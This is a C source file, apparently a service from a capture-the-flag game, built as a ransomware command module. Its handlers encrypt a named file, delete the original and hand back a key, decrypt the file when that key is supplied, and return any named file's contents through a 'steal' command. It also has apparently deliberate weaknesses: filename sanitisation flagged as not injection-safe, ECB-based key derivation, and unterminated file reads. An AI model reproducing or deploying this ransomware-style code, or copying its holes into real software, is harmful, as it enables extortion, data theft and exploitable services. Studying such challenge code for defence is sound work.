#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <gcrypt.h>
#include "ransom_cmd.h"
#include "debug.h"


char SECRET_KEY[16] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};


int init_crypto() {
	FILE *f = fopen(".mainkey", "r");
	if (f) {
		fread(SECRET_KEY, 16, 1, f);
		fclose(f);
	} else {
		gcry_randomize(SECRET_KEY, 16, GCRY_VERY_STRONG_RANDOM);
		int fd = open(".mainkey", O_WRONLY | O_CREAT | O_TRUNC, 0600);
		if (fd < 0) {
			perror("open mainkey");
			return 1;
		}
		f = fdopen(fd, "w");
		fwrite(SECRET_KEY, 16, 1, f);
		fclose(f);
	}
	return 0;
}

// Warning: filename is not command-injection-safe!
static __attribute__((noinline)) char *sanitize_filename(const char *data, size_t len) {
	for (size_t i = 0; i < len; i++) {
		if (data[i] == '\x00') {
			len = i;
			break;
		}
		if (data[i] < '.' || data[i] > 'z' || data[i] == ';' || data[i] == '/' || data[i] == '\\')
			return NULL;
	}
	if (len < 3 || len > 32 || data[0] == '.')
		return NULL;

	char *output;
	if (asprintf(&output, "./%.*s", len, data) < 0)
		return NULL;
	return output;
}

void ransom_message_cmd(struct IncomingMessage *msg, char *data, int len) {
	int s1len = data[0];
	if (len == 0 || s1len >= len) {
		answerRequest(msg, "Invalid request", 15);
		return;
	}

	char *filename = sanitize_filename(data + 1, s1len);
	if (!filename) {
		answerRequest(msg, "Invalid filename", 16);
		return;
	}

	int fd = open(filename, O_WRONLY | O_CLOEXEC | O_CREAT | O_EXCL, 0600);
	free(filename);
	if (fd < 0) {
		answerRequest(msg, "File open failed", 16);
		return;
	}

	FILE *f = fdopen(fd, "w");
	fwrite(data + 1 + s1len, len - s1len - 1, 1, f);
	fclose(f);

	answerRequest(msg, "OK", 2);
}

static __attribute__((noinline)) void derive_key(const char *filename, char *key) {
	char buffer[32];
	memset(buffer, 0, 32);
	strncpy(buffer, filename + 2, 32);

	gcry_cipher_hd_t hd;
	gcry_cipher_open(&hd, GCRY_CIPHER_SERPENT128, GCRY_CIPHER_MODE_ECB, 0);
	gcry_cipher_setkey(hd, SECRET_KEY, 16);
	gcry_cipher_encrypt(hd, buffer, 32, NULL, 0);
	gcry_cipher_close(hd);

	for (int i = 0; i < 16; i++) {
		key[i] = buffer[i] ^ buffer[i + 16];
	}
}

static __attribute__((noinline)) int endswith(const char *haystack, const char *needle) {
	size_t lenstr = strlen(haystack);
	size_t lensuffix = strlen(needle);
	if (lensuffix > lenstr)
		return 0;
	return strncmp(haystack + lenstr - lensuffix, needle, lensuffix) == 0;
}

__attribute__((noinline)) char *read_file(const char *filename, size_t *filesize) {
	FILE *f = fopen(filename, "r");
	if (!f) {
		return NULL;
	}
	fseek(f, 0, SEEK_END);
	*filesize = ftell(f);
	fseek(f, 0, SEEK_SET);
	char *content = malloc(*filesize + 16);
	fread(content, *filesize, 1, f);
	fclose(f);
	return content;
}

void ransom_encrypt_cmd(struct IncomingMessage *msg, char *data, int len) {
	char *filename = sanitize_filename(data, len);
	if (!filename) {
		answerRequest(msg, "Invalid filename", 16);
		return;
	}

	if (endswith(filename, ".enc")) {
		free(filename);
		answerRequest(msg, "Already encrypted", 17);
		return;
	}

	size_t filesize;
	char *content = read_file(filename, &filesize);
	if (!content) {
		free(filename);
		answerRequest(msg, "Can't read file", 15);
		return;
	}

	char *filename2;
	asprintf(&filename2, "%s.enc", filename);
	int fd = open(filename2, O_WRONLY | O_CLOEXEC | O_CREAT | O_EXCL, 0600);
	free(filename2);
	if (fd < 0) {
		free(filename);
		free(content);
		answerRequest(msg, "File open failed", 16);
		return;
	}

	FILE *f = fdopen(fd, "w");

	char key[16];
	unsigned char iv[12];
	char tagbuffer[16];
	derive_key(filename, key);
	gcry_cipher_hd_t hd;
	gcry_create_nonce(iv, 12);
	gcry_cipher_open(&hd, GCRY_CIPHER_TWOFISH128, GCRY_CIPHER_MODE_GCM, 0);
	gcry_cipher_setkey(hd, key, 16);
	gcry_cipher_setiv(hd, iv, 12);
	gcry_cipher_final(hd);
	gcry_cipher_encrypt(hd, content, filesize, NULL, 0);
	gcry_cipher_gettag(hd, tagbuffer, 16);
	gcry_cipher_close(hd);

	fwrite(iv, 12, 1, f);
	fwrite(content, filesize, 1, f);
	fwrite(tagbuffer, 16, 1, f);
	fclose(f);

	remove(filename);
	free(filename);
	free(content);

	char answer[24];
	memcpy(answer, "OK. key=", 8);
	memcpy(answer + 8, key, 16);
	answerRequest(msg, answer, 24);
}

void ransom_decrypt_cmd(struct IncomingMessage *msg, char *data, int len) {
	if (len < 20) {
		answerRequest(msg, "Too short", 9);
		return;
	}
	char *filename = sanitize_filename(data + 16, len - 16);
	if (!filename) {
		answerRequest(msg, "Invalid filename", 16);
		return;
	}

	char key[16];
	derive_key(filename, key);
	if (memcmp(key, data, 16) != 0) {
		free(filename);
		answerRequest(msg, "Key is wrong", 12);
		return;
	}

	char *filename2;
	asprintf(&filename2, "%s.enc", filename);
	size_t filesize;
	char *content = read_file(filename2, &filesize);
	free(filename);
	free(filename2);
	if (!content) {
		answerRequest(msg, "Can't read file", 15);
		return;
	}

	gcry_cipher_hd_t hd;
	gcry_cipher_open(&hd, GCRY_CIPHER_TWOFISH128, GCRY_CIPHER_MODE_GCM, 0);
	gcry_cipher_setkey(hd, key, 16);
	gcry_cipher_setiv(hd, content, 12);
	gcry_cipher_final(hd);
	gcry_cipher_decrypt(hd, content + 12, filesize - 12 - 16, NULL, 0);
	gcry_error_t err = gcry_cipher_checktag(hd, content + filesize - 16, 16);
	gcry_cipher_close(hd);

	if (err) {
		free(content);
		answerRequest(msg, "Invalid tag", 11);
		return;
	}

	answerRequest(msg, content + 12, filesize - 16 - 12);
	free(content);
}

void steal_cmd(struct IncomingMessage *msg, char *data, int len) {
	char *filename = sanitize_filename(data, len);
	if (!filename) {
		answerRequest(msg, "Invalid filename", 16);
		return;
	}

	size_t filesize;
	char *content = read_file(filename, &filesize);
	free(filename);
	if (!content) {
		answerRequest(msg, "Can't read file", 15);
		return;
	}

	answerRequest(msg, content, filesize);
	free(content);
}
